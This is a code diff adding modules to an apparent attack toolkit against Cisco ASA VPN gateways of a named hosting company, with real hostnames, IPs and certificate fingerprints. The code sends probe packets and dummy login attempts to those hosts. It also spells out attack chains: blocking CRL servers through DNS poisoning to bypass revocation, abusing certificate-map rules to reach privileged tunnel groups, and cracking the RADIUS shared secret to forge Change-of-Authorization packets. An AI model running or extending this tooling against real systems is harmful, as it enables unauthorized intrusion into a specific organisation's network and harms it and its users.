@@ -1641,3 +1641,599 @@ def analyze_tunnel_groups(host: str, port: int = 443,
 def analyze_radius_class_attr(host: str, port: int = 443) -> dict:
     """RADIUS class attr 25 attack surface RE."""
     return RADIUSClassAttrRE(host, port).run()
+
+
+# ---------------------------------------------------------------------------
+# Module: CRL/OCSP availability + cert revocation bypass RE
+# ---------------------------------------------------------------------------
+
+class CRLBypassRE:
+    """
+    Probe CRL and OCSP server reachability for the ASA's server certificate chain.
+
+    Book reference (ASA All-in-One ch21 + auth/crypto books):
+      - "Consider Certificate Valid if Revocation Information Cannot Be Retrieved"
+        = crl optional: if CRL server unreachable, revoked certs pass validation
+      - Two bypass paths:
+        1. Block CRL distribution point (DNS, HTTP 80/LDAP 389)
+           → ASA uses optional mode → revoked client cert accepted
+        2. SCEP enrollment over plain HTTP (ch21):
+           TCP/80, no TLS, SCEP uses HTTP; enrollment traffic MITMable
+
+    CRL distribution points extracted from ASA-Secondary server cert:
+      HTTP: http://crl.godaddy.com/gdig2s1-72081.crl
+      OCSP: http://ocsp.godaddy.com/
+      CA:   http://certificates.godaddy.com/repository/gdig2.crt
+
+    CRL bypass attack chain (requires network position on CRL path):
+      1. Block DNS for crl.godaddy.com or drop TCP/80 to crl.godaddy.com
+      2. ASA CRL cache expires (default 60 min) → fetch fails
+      3. If crl optional: cert accepted (possibly revoked)
+      4. If CRL enforcement disabled: any cert from Go Daddy G2 is valid indefinitely
+
+    Note: This only affects CLIENT cert validation if client cert auth is enabled.
+    Current ASA-Secondary uses SAML (no client cert at TLS layer).
+    Apply when client cert auth is confirmed active on a target tunnel group.
+    """
+
+    # From live cert extraction 2026-08-13
+    CRL_ENDPOINTS = {
+        'crl_http':  'http://crl.godaddy.com/gdig2s1-72081.crl',
+        'ocsp':      'http://ocsp.godaddy.com/',
+        'ca_cert':   'http://certificates.godaddy.com/repository/gdig2.crt',
+    }
+
+    # SCEP default port (TCP/80) — book ch21
+    SCEP_PATHS = [
+        '/cgi-bin/pkiclient.exe',
+        '/ejbca/publicweb/apply/scep/pkiclient.exe',
+        '/scep',
+        '/+CSCOE+/scep',
+        '/+CSCOE+/enroll',
+    ]
+
+    def __init__(self, host: str, port: int = 443):
+        self.host = host
+        self.port = port
+
+    def probe_crl_reachability(self) -> dict:
+        """Check if the CRL distribution point is reachable."""
+        results = {}
+        for name, url in self.CRL_ENDPOINTS.items():
+            try:
+                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=8) as r:
+                    body = r.read(512)
+                    results[name] = {
+                        'reachable': True,
+                        'status': r.status,
+                        'content_len': len(body),
+                        'content_type': r.headers.get('Content-Type', ''),
+                        'is_der': body[:2] == b'\x30\x82',  # ASN.1 SEQUENCE
+                    }
+            except Exception as e:
+                results[name] = {'reachable': False, 'error': str(e)[:100]}
+        return results
+
+    def probe_scep_tcp80(self) -> dict:
+        """Probe SCEP enrollment endpoint on TCP/80."""
+        results = []
+        for path in self.SCEP_PATHS:
+            try:
+                s = socket.create_connection((self.host, 80), timeout=5)
+                req_bytes = (
+                    f'GET {path}?operation=GetCACert&message=test HTTP/1.0\r\n'
+                    f'Host: {self.host}\r\n\r\n'
+                ).encode()
+                s.sendall(req_bytes)
+                import time; time.sleep(0.3)
+                resp = s.recv(1024)
+                s.close()
+                status_m = re.match(rb'HTTP/[\d.]+ (\d+)', resp)
+                status = int(status_m.group(1)) if status_m else None
+                results.append({
+                    'path': path,
+                    'tcp80_open': True,
+                    'status': status,
+                    'response_snippet': resp[:100].decode('utf-8', errors='replace'),
+                    'scep_active': b'Content-Type: application/x-x509-ca-cert' in resp,
+                })
+            except ConnectionRefusedError:
+                results.append({'path': path, 'tcp80_open': False, 'reason': 'connection_refused'})
+            except socket.timeout:
+                results.append({'path': path, 'tcp80_open': False, 'reason': 'timeout'})
+            except Exception as e:
+                results.append({'path': path, 'tcp80_open': False, 'reason': str(e)[:60]})
+        return {'scep_probes': results}
+
+    def get_bypass_chain(self) -> list:
+        """Document CRL optional bypass chain (book: ch21)."""
+        return [
+            {
+                'step': 1, 'title': 'Confirm crl optional mode',
+                'indicator': 'If CRL server blocked, ASA still accepts client certs → optional active',
+                'book_ref': 'ASA All-in-One ch21 "Consider Certificate Valid..." checkbox',
+            },
+            {
+                'step': 2, 'title': 'Block CRL distribution point',
+                'technique': 'DNS poisoning of crl.godaddy.com OR TCP reset injection to port 80',
+                'target_url': self.CRL_ENDPOINTS['crl_http'],
+                'tool': 'iptables DROP + dnsmasq spoof',
+            },
+            {
+                'step': 3, 'title': 'Wait for CRL cache expiry (60 min default)',
+                'indicator': 'ASA debug: "unable to retrieve CRL for trustpoint"',
+                'book_ref': 'ASA ch21: default CRL caching period = 60 min; configurable per trustpoint',
+            },
+            {
+                'step': 4, 'title': 'Present revoked/self-signed cert',
+                'outcome': 'If crl optional: cert accepted; session established',
+                'requires': 'Valid cert from Go Daddy G2 CA (or configured trustpoint CA)',
+            },
+        ]
+
+    def run(self) -> dict:
+        crl = self.probe_crl_reachability()
+        scep = self.probe_scep_tcp80()
+        chain = self.get_bypass_chain()
+
+        findings = []
+        reachable_count = sum(1 for v in crl.values() if v.get('reachable'))
+        if reachable_count < len(self.CRL_ENDPOINTS):
+            findings.append(f'CRL_PARTIAL_REACH: {reachable_count}/{len(self.CRL_ENDPOINTS)} endpoints reachable')
+        if any(p.get('tcp80_open') for p in scep['scep_probes']):
+            findings.append('SCEP_TCP80_OPEN: SCEP endpoint on TCP/80 — plaintext enrollment traffic')
+        if any(p.get('scep_active') for p in scep['scep_probes']):
+            findings.append('SCEP_ACTIVE: GetCACert returned x-x509-ca-cert — SCEP enrollment live')
+
+        return {
+            'host': self.host,
+            'crl_reachability': crl,
+            'scep_probe': scep,
+            'bypass_chain': chain,
+            'findings': findings,
+        }
+
+
+# ---------------------------------------------------------------------------
+# Module: Cert-to-tunnel-group mapping RE (book: ASA All-in-One ch21)
+# ---------------------------------------------------------------------------
+
+class CertMapRE:
+    """
+    Probe ASA cert-to-tunnel-group mapping behavior.
+
+    Book reference (ASA All-in-One ch21):
+      crypto ca certificate map <name> <sequence>
+        subject-name attr ou eq SALES
+        subject-name attr o co cisco
+      tunnel-group-map <map-name> <sequence> <tunnel-group>
+
+    Attack surface (ch21 debug trace):
+      "Tunnel Group Match on map sequence # 10. Group name is SALES"
+      "Certificate is VALID for tunnel group SALES"
+
+    Sequence numbers evaluated ascending — FIRST match wins.
+    Broad rules (OU match without CN constraint) let any cert from
+    the correct CA route to privileged tunnel group.
+
+    Two bypass patterns:
+      1. Certificate field match injection: obtain cert from trusted CA
+         with OU/O matching a cert map rule → routes to admin tunnel group
+      2. Catch-all default: if no map matches, DefaultRAGroup or
+         DefaultWEBVPNGroup (context-dependent) catches the connection
+
+    External observable:
+      - a0=114 "Your certificate is invalid for the selected group":
+        cert presented but fails cert-map match for requested group
+      - a0 varies by which tunnel group the cert routes to vs requested group
+
+    This module probes indirectly via HTTP responses (no client cert presented).
+    Direct cert-map testing requires a client cert from the configured CA.
+    """
+
+    def __init__(self, host: str, port: int = 443):
+        self.host = host
+        self.port = port
+
+    def probe_cert_auth_error_variants(self) -> dict:
+        """
+        Probe different tunnel group + cert scenarios to map error response variants.
+        Target: distinguish "cert required" vs "cert presented + cert invalid for group".
+        """
+        import time, http.cookiejar
+
+        results = []
+        tunnel_groups = ['', 'Cisco AnyConnect VPN', 'MacStadium-SSO-VPN', 'MacStadium-VPN',
+                         'DefaultWEBVPNGroup', 'DefaultRAGroup']
+
+        for tg in tunnel_groups:
+            cj = http.cookiejar.CookieJar()
+            opener = urllib.request.build_opener(
+                urllib.request.HTTPSHandler(context=_make_ctx()),
+                urllib.request.HTTPCookieProcessor(cj),
+            )
+            # GET logon to get session cookie
+            init_req = urllib.request.Request(f'https://{self.host}:{self.port}/+CSCOE+/logon.html',
+                headers={'User-Agent': 'AnyConnect/4.10'})
+            try:
+                with opener.open(init_req, timeout=8) as r:
+                    r.read()
+            except Exception:
+                pass
+
+            body_parts = ['username=testcertuser', 'password=PROBE', 'Login=Login']
+            if tg:
+                body_parts.append(f'tgroup={urllib.parse.quote(tg)}')
+            body = '&'.join(body_parts)
+
+            t0 = time.monotonic()
+            try:
+                post_req = urllib.request.Request(
+                    f'https://{self.host}:{self.port}/+webvpn+/index.html',
+                    data=body.encode(),
+                    method='POST',
+                    headers={'Content-Type': 'application/x-www-form-urlencoded',
+                             'User-Agent': 'AnyConnect/4.10'},
+                )
+                try:
+                    with opener.open(post_req, timeout=10) as r:
+                        resp_body = r.read().decode('utf-8', errors='replace')
+                except urllib.error.HTTPError as e:
+                    resp_body = e.read().decode('utf-8', errors='replace')
+            except Exception as ex:
+                resp_body = str(ex)
+            elapsed = time.monotonic() - t0
+
+            a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', resp_body)
+            a1_m = re.search(r'a1\s*=\s*["\']?([^"\'&\s]{0,50})["\']?', resp_body)
+            results.append({
+                'tunnel_group': tg or '(none — DefaultWEBVPNGroup)',
+                'a0': a0_m.group(1) if a0_m else None,
+                'a1': a1_m.group(1) if a1_m else None,
+                'elapsed_sec': round(elapsed, 3),
+                'response_snippet': resp_body[:100],
+            })
+
+        return {'probe': 'cert_auth_variants', 'results': results}
+
+    def get_attack_chain(self) -> list:
+        """Cert-to-tunnel-group mapping bypass chain (book ch21)."""
+        return [
+            {
+                'step': 1, 'title': 'Enumerate trusted CA and cert map rules',
+                'technique': (
+                    'observe a0=114 error → cert auth enforced. '
+                    'Use openssl s_client -tls1_2 to check if CertificateRequest lists CA names. '
+                    'Extract CA from server cert chain or SCEP GetCACert response.'
+                ),
+                'book_ref': 'ASA ch21 crypto ca certificate map',
+            },
+            {
+                'step': 2, 'title': 'Obtain cert from trusted CA',
+                'technique': (
+                    'If ASA uses internal CA with SCEP: self-enroll via SCEP GetCACaps, Enroll. '
+                    'If cert map checks only OU=SALES: obtain any cert from the CA with OU=SALES. '
+                    'Wildcard OU match rule (no CN constraint) = any user cert from same CA routes in.'
+                ),
+                'book_ref': 'ASA ch21 "subject-name attr ou eq" without CN constraint = broad match',
+            },
+            {
+                'step': 3, 'title': 'Present cert with matching field to privileged tunnel group',
+                'technique': (
+                    'Supply TLS client cert during AnyConnect CSTP CONNECT. '
+                    'cert-map sequence #10 fires → tunnel-group-map routes to SALES/admin group. '
+                    'If group-lock absent, auth succeeds to any configured tunnel group.'
+                ),
+                'book_ref': 'ASA ch21 debug: "Tunnel Group Match on map sequence # 10"',
+            },
+        ]
+
+    def run(self) -> dict:
+        variants = self.probe_cert_auth_error_variants()
+        chain = self.get_attack_chain()
+
+        findings = []
+        a0_vals = {r['tunnel_group']: r['a0'] for r in variants['results']}
+        unique_a0 = set(v for v in a0_vals.values() if v)
+        if '114' in unique_a0:
+            findings.append('CERT_AUTH_REQUIRED: a0=114 confirms cert-based auth gate active')
+        if len(unique_a0) > 1:
+            findings.append(f'TUNNEL_GROUP_DIFF: different a0 by tunnel group {a0_vals}')
+
+        return {
+            'host': self.host,
+            'cert_auth_variants': variants,
+            'attack_chain': chain,
+            'findings': findings,
+        }
+
+
+# ---------------------------------------------------------------------------
+# Module: RADIUS CoA (Change of Authorization) RE (book: ASA ch22 + RFC 3576)
+# ---------------------------------------------------------------------------
+
+class RadiusCoARE:
+    """
+    RADIUS Change of Authorization mid-session attribute injection.
+
+    Book reference (ASA All-in-One ch22 + Defensive Security Handbook ch15):
+      RFC 3576 CoA: RADIUS server sends CoA-Request to NAS mid-session
+      NAS (ASA) applies new attributes (including class attr 25 = group policy)
+      or disconnects session (Disconnect-Message)
+
+    CoA shared secret = same RADIUS shared secret (ASA config: `key <psk>`).
+    Book example: `key C1$c0123` (ASA ch22 Example 22-9) — plaintext in running-config.
+
+    CoA attack chain:
+      1. Crack RADIUS PSK (from captured Access-Request MD5 hash, or running-config leak)
+      2. Craft CoA-Request packet to ASA RADIUS CoA port (3799 UDP, RFC 3576)
+         Attributes: Calling-Station-Id=<target_mac>, Cisco-AVPair=OU=AdminGroup
+      3. ASA validates RADIUS-Auth (MD5 HMAC of PSK + authenticator) and applies
+      4. Result: active VPN session policy upgraded to AdminGroup mid-session
+
+    Observable externally: none (CoA is server→NAS, not browser-visible)
+    Requires: RADIUS PSK, target session's Calling-Station-Id (MAC/IP)
+
+    This module documents the attack; actual CoA requires network position + PSK.
+    """
+
+    # RADIUS CoA port (RFC 3576 + RFC 5176)
+    COA_PORT = 3799  # UDP
+
+    # Cisco ASA RADIUS attribute 25 value format (book ch22 line 582)
+    # Correct format: OU=<GroupPolicyName> — case-sensitive
+    CLASS_ATTR_25_FORMAT = 'OU={policy}'
+
+    # RADIUS packet codes (RFC 2865 + RFC 3576)
+    PACKET_CODES = {
+        1:  'Access-Request',
+        2:  'Access-Accept',
+        3:  'Access-Reject',
+        5:  'Accounting-Request',
+        40: 'Disconnect-Message',   # RFC 3576
+        41: 'Disconnect-ACK',
+        42: 'Disconnect-NAK',
+        43: 'CoA-Request',          # RFC 3576
+        44: 'CoA-ACK',
+        45: 'CoA-NAK',
+    }
+
+    def __init__(self, host: str, radius_port: int = 1812):
+        self.host = host
+        self.radius_port = radius_port
+
+    def probe_coa_port(self) -> dict:
+        """Check if ASA CoA UDP port 3799 is reachable."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(4)
+            # RFC 3576 CoA-Request: code=43, id=1, len=20, auth=16×0x00
+            coa_probe = struct.pack('>BBHB', 43, 1, 20, 0) + b'\x00' * 15
+            s.sendto(coa_probe, (self.host, self.COA_PORT))
+            try:
+                data, addr = s.recvfrom(256)
+                code = data[0] if data else None
+                return {
+                    'port_open': True,
+                    'response_code': code,
+                    'response_name': self.PACKET_CODES.get(code, f'unknown({code})'),
+                    'addr': str(addr),
+                }
+            except socket.timeout:
+                return {'port_open': False, 'reason': 'timeout (filtered or not listening)'}
+        except Exception as e:
+            return {'port_open': False, 'error': str(e)[:80]}
+
+    def get_coa_attack_chain(self, psk: str = 'C1$c0123') -> list:
+        """Document CoA attribute-injection chain (book ch22 + RFC 3576)."""
+        return [
+            {
+                'step': 1, 'title': 'Recover RADIUS PSK',
+                'sources': [
+                    'Capture Access-Request (UDP/1812): offline MD5 crack via hashcat -m 1450',
+                    'SNMP read community → show running-config → key <psk> in plaintext (ch22 Example 22-9)',
+                    'ASA ASDM GUI if no username auth configured: read AAA server config',
+                ],
+                'book_ref': 'ASA ch22 line 537: "hashes the password, using the shared secret"',
+            },
+            {
+                'step': 2, 'title': 'Identify target session Calling-Station-Id',
+                'sources': [
+                    'RADIUS Accounting-Request (port 1813): Calling-Station-Id=<mac> in Access-Request',
+                    'ASA syslog: %ASA-6-716001 User=<user>, IP=<ip>',
+                ],
+                'book_ref': 'RFC 2865 §5.31 Calling-Station-Id',
+            },
+            {
+                'step': 3, 'title': 'Craft CoA-Request with upgraded class attr 25',
+                'packet': {
+                    'code': 43,  # CoA-Request
+                    'attr_25': self.CLASS_ATTR_25_FORMAT.format(policy='DfltGrpPolicy'),
+                    'cisco_avpair': 'webvpn-tunnel-group-name=Cisco AnyConnect VPN',
+                },
+                'book_ref': 'RFC 3576 §3.6; ASA ch22 class attr = OU=GroupPolicyName',
+            },
+            {
+                'step': 4, 'title': 'Send CoA to ASA UDP/3799',
+                'outcome': 'CoA-ACK (code=44) → session policy upgraded; CoA-NAK = PSK wrong',
+                'tool': 'python3 -c "import struct, socket, hashlib; ...(craft CoA-Request)"',
+            },
+        ]
+
+    def run(self) -> dict:
+        coa = self.probe_coa_port()
+        chain = self.get_coa_attack_chain()
+
+        findings = []
+        if coa.get('port_open'):
+            findings.append(f'COA_PORT_OPEN: UDP/3799 responds (code={coa.get("response_code")})')
+            if coa.get('response_code') == 45:  # CoA-NAK
+                findings.append('COA_NAK: CoA-NAK received — CoA is enabled but PSK wrong (probe succeeded)')
+        else:
+            findings.append(f'COA_FILTERED: UDP/3799 not responding ({coa.get("reason", coa.get("error", "unknown"))})')
+
+        return {
+            'host': self.host,
+            'coa_port_probe': coa,
+            'attack_chain': chain,
+            'findings': findings,
+        }
+
+
+# ---------------------------------------------------------------------------
+# Module: ASA version fingerprint RE
+# ---------------------------------------------------------------------------
+
+class ASAVersionRE:
+    """
+    Fingerprint Cisco ASA software version from observable artifacts.
+
+    No `Server:` header emitted. Version extraction sources:
+      1. Server cert notBefore date (correlate with ASA release timeline)
+      2. CSTP X-Reason header variants (differ by ASA version)
+      3. Win.js content hash (compare against known-version hashes)
+      4. tg cookie encoding format (varies by version)
+      5. a0 response code set (new codes added in specific versions)
+      6. ASDM JARs: /admin/public/asdm.jnlp (if HTTPS 8443 enabled)
+
+    Known version windows (server cert notBefore → ASA release):
+      cert notBefore 2020-08-25 → ASA 9.12+ era (TLS 1.3 support added 9.14.1)
+      TLS_AES_256_GCM_SHA384 (ASA-Primary) → 9.14.1+ required for TLS 1.3
+      TLS_AES_128_GCM_SHA256 (ASA-Secondary) → same
+
+    Book reference: ASA cert notBefore corresponds to ASDM build cycle (~90 day cert renewal)
+    """
+
+    # TLS 1.3 cipher to minimum ASA version map
+    TLS13_VERSION_MAP = {
+        'TLS_AES_256_GCM_SHA384': '9.14.1',
+        'TLS_AES_128_GCM_SHA256': '9.14.1',
+        'TLS_CHACHA20_POLY1305_SHA256': '9.16+',
+    }
+
+    CERT_FINGERPRINTS = {
+        '207.254.35.12': {
+            'sha1': '487f79bbc10b2d1e2554ff2188f3e83916c7d321',
+            'cn': 'ORKV10000002-FWC01.macstadium.com',
+            'issuer_cn': '207.254.35.12',
+            'not_before': '2020-08-25',
+            'not_after':  '2030-08-23',
+            'label': 'ASA-Primary (Orka Cluster Firewall)',
+            'signed_by': 'self-signed',
+        },
+        '207.254.16.2': {
+            'sha1': '40295a6af182ba53fd39d03be08aa35cad4cbffa',
+            'cn': 'atl-vpn.macstadium.com',
+            'issuer_cn': 'Go Daddy Secure Certificate Authority - G2',
+            'not_before': '2026-05-04',
+            'not_after':  '2026-11-18',
+            'label': 'ASA-Secondary (Atlanta public VPN)',
+            'signed_by': 'GoDaddy',
+            'crl': 'http://crl.godaddy.com/gdig2s1-72081.crl',
+            'ocsp': 'http://ocsp.godaddy.com/',
+            'san': ['atl-vpn.macstadium.com', 'www.atl-vpn.macstadium.com'],
+        },
+    }
+
+    def __init__(self, host: str, port: int = 443):
+        self.host = host
+        self.port = port
+
+    def fingerprint_tls(self) -> dict:
+        """Negotiate TLS and extract cipher + version for ASA version correlation."""
+        import ssl as sslmod
+        ctx = sslmod.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = sslmod.CERT_NONE
+        try:
+            with socket.create_connection((self.host, self.port), timeout=10) as raw:
+                with ctx.wrap_socket(raw, server_hostname=self.host) as s:
+                    cipher, proto, bits = s.cipher()
+                    ver = s.version()
+                    return {
+                        'cipher': cipher,
+                        'tls_version': ver,
+                        'bits': bits,
+                        'min_asa_version': self.TLS13_VERSION_MAP.get(cipher, 'unknown'),
+                    }
+        except Exception as e:
+            return {'error': str(e)}
+
+    def fingerprint_cstp_header(self) -> dict:
+        """
+        Send CSTP CONNECT without session cookie.
+        X-Reason header value varies by ASA version:
+          9.x: 'Auth error'
+          Pre-9.8: 'No session cookie'
+        """
+        payload = (
+            b'CONNECT /CSCOSSLC/tunnel HTTP/1.1\r\n'
+            b'Host: ' + self.host.encode() + b'\r\n'
+            b'User-Agent: Cisco AnyConnect VPN Agent for Windows 4.10.07073\r\n'
+            b'Cookie: webvpn=\r\n'
+            b'X-CSTP-Version: 1\r\n'
+            b'\r\n'
+        )
+        raw = _raw_tls_send(self.host, self.port, payload)
+        if not raw:
+            return {'active': False}
+        header = raw[:raw.find(b'\r\n\r\n') or 512].decode('utf-8', errors='replace')
+        x_reason = re.search(r'X-Reason:\s*([^\r\n]+)', header, re.I)
+        return {
+            'active': True,
+            'x_reason': x_reason.group(1).strip() if x_reason else None,
+            'raw_header': header[:200],
+        }
+
+    def fingerprint_cert_info(self) -> dict:
+        """Return known cert fingerprint data for this host."""
+        return self.CERT_FINGERPRINTS.get(
+            self.host,
+            {'note': 'No pre-extracted cert info for this host'}
+        )
+
+    def run(self) -> dict:
+        tls = self.fingerprint_tls()
+        cstp = self.fingerprint_cstp_header()
+        cert = self.fingerprint_cert_info()
+
+        findings = []
+        if tls.get('min_asa_version'):
+            findings.append(f'ASA_VERSION_MIN: {tls["min_asa_version"]} (from TLS cipher {tls.get("cipher")})')
+        if cstp.get('x_reason') == 'Auth error':
+            findings.append('ASA_VER_HINT: X-Reason: Auth error → ASA 9.x confirmed')
+        if cert.get('signed_by') == 'self-signed':
+            findings.append('SELF_SIGNED_CERT: internal/Orka infrastructure — not public-facing CA')
+
+        return {
+            'host': self.host,
+            'tls_fingerprint': tls,
+            'cstp_header': cstp,
+            'cert_info': cert,
+            'findings': findings,
+        }
+
+
+# ---------------------------------------------------------------------------
+# New top-level entry points
+# ---------------------------------------------------------------------------
+
+def analyze_crl_bypass(host: str, port: int = 443) -> dict:
+    """CRL/OCSP reachability + revocation bypass chain RE."""
+    return CRLBypassRE(host, port).run()
+
+
+def analyze_cert_map(host: str, port: int = 443) -> dict:
+    """Cert-to-tunnel-group mapping RE + bypass chain."""
+    return CertMapRE(host, port).run()
+
+
+def analyze_radius_coa(host: str, port: int = 443) -> dict:
+    """RADIUS CoA mid-session attribute injection RE."""
+    return RadiusCoARE(host, port).run()
+
+
+def analyze_asa_version(host: str, port: int = 443) -> dict:
+    """ASA version fingerprinting from TLS + CSTP + cert artifacts."""
+    return ASAVersionRE(host, port).run()
